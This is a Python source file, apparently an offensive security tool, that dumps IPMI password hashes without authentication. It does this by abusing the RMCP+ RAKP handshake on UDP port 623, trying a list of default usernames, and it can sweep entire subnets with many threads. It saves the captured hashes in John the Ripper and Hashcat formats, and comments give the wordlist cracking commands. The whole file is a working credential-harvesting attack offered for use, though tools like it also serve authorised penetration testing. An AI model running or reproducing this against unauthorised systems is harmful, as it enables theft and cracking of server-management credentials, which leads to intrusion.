#! /usr/bin/env python3
'''
	Copyright 2020 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        This should work on Linux & Windows using Python2
        
        File name GetIPMIHashes.py
        written by tijl[dot]deneut[at]howest[dot]be

        --- IPMI Unauthenticated Hash Dumper ---
        Walks through most known default usernames to retrieve hashes
'''
import socket, binascii, os, struct, argparse, sys, time
from multiprocessing.dummy import Pool as ThreadPool
from itertools import repeat

def send_only(s, ip, port, string):
    data = binascii.unhexlify(string.replace(' ',''))
    s.sendto(data, (ip, port))

def recv_only(s):
    data, addr=s.recvfrom(1024)
    return data, addr

def convertInt(iInput, iLength): ## convertInt(30, 8) == '1e000000'
    return struct.pack("<I" , int(iInput)).hex()[:iLength]

def send_and_receive(sock, dIP, dPort, data):
    send_only(sock, dIP, dPort, data)
    receivedData = []
    try:
        receivedData.append(recv_only(sock))
        for r in receivedData: retData = binascii.hexlify(r[0])
        return retData
    except: return ''

def getIPs(cidr):
    def ip2bin(ip):
        b = ''
        inQuads = ip.split('.')
        outQuads = 4
        for q in inQuads:
            if q != '':
                b += dec2bin(int(q),8)
                outQuads -= 1
        while outQuads > 0:
            b += '00000000'
            outQuads -= 1
        return b
    def bin2ip(b):
        ip = ''
        for i in range(0,len(b),8):
            ip += str(int(b[i:i+8],2)) + '.'
        return ip[:-1]
    def dec2bin(n,d=None):
        s = ''
        while n>0:
            if n&1: s = '1' + s
            else: s = '0' + s
            n >>= 1
        if d is not None:
            while len(s)<d: s = '0' + s
        if s == '': s = '0'
        return s
    iplist=[]
    parts = cidr.split("/")
    baseIP = ip2bin(parts[0])
    subnet = int(parts[1])
    if subnet == 32:
        iplist.append(bin2ip(baseIP))
    else:
        ipPrefix = baseIP[:-(32-subnet)]
        for i in range(2**(32-subnet)):
            iplist.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
    return iplist

def testIP(dIP, dPort, iTimeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(iTimeout)
    
    data = '06 00 ff 07'
    data += '06 10 00000000 00000000 2000'
    data += '00000000 ' + '01020304' + ' 00000008 01000000 01000008 01000000 02000008 01000000'
    try: sResponse1 = send_and_receive(sock, dIP, dPort, data)
    except: sResponse1 = ''
    sock.close()
    if sResponse1 == '': return False
    return True

def attemptRetrieve(sUser, dIP, dPort, iTimeout, bVerbose, bOutput, bScan):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(iTimeout)
    #sock.bind((sSrcIP,0))
    
    ### Packet 1 (RMCP+ Open Session Request)
    rSessionID = binascii.hexlify(os.urandom(4)).decode()
    # <Version:06><Reserved:00><Sequence:ff><TypeIPMI, Normal RMCP:07>
    # <AuthenticationType,RCMP+:06><PayloadType:10><SessionID:00000000><SessionSequenceNr:00000000><MessageLength:2000>
    # <DATA> 00000000 41b781df 00000008 01000000 01000008 01000000 02000008 01000000
    data = '06 00 ff 07'
    data += '06 10 00000000 00000000 2000'
    data += '00000000 ' + rSessionID + ' 00000008 01000000 01000008 01000000 02000008 01000000'
    try: sResponse1 = send_and_receive(sock, dIP, dPort, data).decode()
    except:
        if bVerbose: print('[!] Error, IP ' + str(dIP) + ' not reachable')
        return '', ''
    rRequestID = ''
    if sResponse1 == '':
        if bVerbose: print('[!] Error, IP ' + str(dIP) + ' has no response')
        sock.close()
        return '', ''
    elif not sResponse1[40:48] == rSessionID:
        if bVerbose: print('[!] Error, received rSessionID seems wrong (' + sResponse1[40:48] + ' <> ' + rSessionID + ')')
    else:
        rRequestID = sResponse1.split(rSessionID)[1][:8]
        if bVerbose: print('[*] Init worked, Session ID: ' + str(rSessionID) + ', and rRequestID: ' + rRequestID)
    
    ### Packet 2 (RAKP Message Request)
    data = '06 00 ff 07 '
    sUserLength1 = convertInt(28 + len(sUser), 2)
    data += '06 12 00000000 00000000 ' + sUserLength1 + '00'
    rRequestSALT = binascii.hexlify(os.urandom(16)).decode()
    sUserLength2 = convertInt(len(sUser), 2)
    sHexUser = binascii.hexlify(sUser.encode()).decode()
    data += '00000000 ' + rRequestID + ' ' + rRequestSALT + ' 1400 00' + sUserLength2 + ' '  + sHexUser
    sResponse2 = send_and_receive(sock, dIP, dPort, data).decode()
    iMessageLength = int(sResponse2[28:30],16)
    if iMessageLength == 8:
        if bVerbose: print('[-] User \'' + sUser + '\' does not seem to be a valid user on this system')
    else:
        print('[+] Got hash for user \'' + sUser + '\' (' + dIP + ')')
        try:
            sResponseData = sResponse2.split(rSessionID)[1] ## Should be length (iMessageLength - 8) * 2
            if not len(sResponseData) == (iMessageLength - 8) * 2:
                if bVerbose:
                    print('[!] Error: Problem with length, full response: ')
                    print(sResponse2)
                sock.close()
                return False
            if iMessageLength == 60:
                sResponseSalt = sResponseData[:64]
                sResponseHash = sResponseData[64:]
            else:
                if bVerbose:
                    print('[!] Found response, but not expected length. Dumping full response')
                    print(sResponse2)
                return False
            
            sHashString = rSessionID + rRequestID + rRequestSALT + sResponseSalt + '14' + sUserLength2 + sHexUser + ':' + sResponseHash
            print('[+] Hash (John format):')
            print(dIP + ' ' + sUser + ':' + '$rakp$' + sHashString.replace(':','$'))
            print('[+] Hash (Hashcat format):')
            print(sHashString)
            if bOutput or bScan:
                ## john RAKP-HASH-John.txt --wordlist=/usr/share/wordlists/rockyou.txt
                f = open('RAKP-HASH-John.txt', 'a+')
                f.write(dIP + ' ' + sUser + ':' + '$rakp$' + sHashString.replace(':','$') + '\n')
                f.close()
                ## hashcat -a 0 -m 7300 RAKP-HASH-HashCat.txt /usr/share/wordlists/rockyou.txt --force
                f = open('RAKP-HASH-HashCat.txt', 'a+')
                f.write(sHashString + '\n')
                f.close()
        except:
            print('[!] Found response, but error in parsing. Dumping full response')
            print(sResponse2)
            return False
    if bVerbose: print('[*] --------\n')
    sock.close()

def walkThroughUsers(args):
    arrUsers = args[0]; dIP = args[1]; dPort = args[2]; iTimeout = args[3]; bVerbose = args[4]; bOutput = args[5]; bScan = args[6];
    if testIP(dIP, dPort, iTimeout): print('[+] IP ' + dIP + ' has RMCP+ running.')
    else:
        if not bScan: print('[-] IP ' + dIP + ' has no RMCP+ running.')
        return
    for user in arrUsers:
        if bVerbose: print('[*] Trying user: \'' + user + '\' (' + dIP + ')')
        attemptRetrieve(user, dIP, dPort, iTimeout, bVerbose, bOutput, bScan)

def main():
    ## Global variables, change at will
    arrUsers = ['admin','root','ADMIN','Admin','Administrator','USERID','guest','vmware','ups']
    dIP = '192.168.1.1'
    dPort = 623
    iTimeout = 3
    bVerbose = False
    bOutput = False
    bScan = False
    ## Banner
    #os.system('cls' if os.name == 'nt' else 'clear')
    print("""
    [*****************************************************************************]
                          --- IPMI Hash Dumper ---
    This script will try multiple users and without authentication dump hashes.
    Just run it without arguments, or provide arguments of your choice
    ______________________/-> Created By Tijl Deneut(c) <-\_______________________
    [*****************************************************************************]
    """)
    ## Defaults and parsing arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help="TARGET mode, provide IP address", default='')
    parser.add_argument('-s', '--scan', help="SCAN mode, provide subnet (ignores target)", default='')
    parser.add_argument('-p', '--port', help="Target UDP Port, default 623", default=623, type=int)
    parser.add_argument('-v', '--verbose', help="Verbosity; more info", action="store_true")
    parser.add_argument('-l', '--list', help="Custom list of usernames. E.g. '/usr/share/metasploit-framework/data/wordlists/ipmi_users.txt'", default='')
    parser.add_argument('-o', '--output', help="Create output files for John & Hashcat, default on when scanning", action='store_true')
    args = parser.parse_args()
    if args.target == '' and args.scan == '': dIP = input('Please enter target IP address [192.168.1.1]: ')
    elif not args.target == '': dIP = args.target
    dPort = args.port
    if args.verbose == 1: bVerbose = True
    if args.output == 1: bOutput = True
    if not args.list == '':
        f = open(args.list,"r")
        arrUsers = []
        for user in f.readlines():
            arrUsers.append(user.replace('\r','').replace('\n',''))
        f.close()

    if not args.scan == '':
        arrIPs = getIPs(args.scan)
        bScan = True
        print('[*] Starting threads ...')
        pool = ThreadPool(64)
        pool.map(walkThroughUsers, zip(repeat(arrUsers), arrIPs, repeat(dPort), repeat(iTimeout), repeat(bVerbose), repeat(bOutput), repeat(bScan)))
        ## -> This is for running non-multi-threaded
        #for dIP in arrIPs:
            #walkThroughUsers(arrUsers, dIP, dPort, iTimeout, bVerbose, bOutput, bScan)
    else:
        if not walkThroughUsers((arrUsers, dIP, dPort, iTimeout, bVerbose, bOutput, bScan)): exit(1)
    if len(sys.argv) == 1:
        raw_input('Press [Enter] key to exit')
    exit(0)

if __name__ == '__main__':
    main()
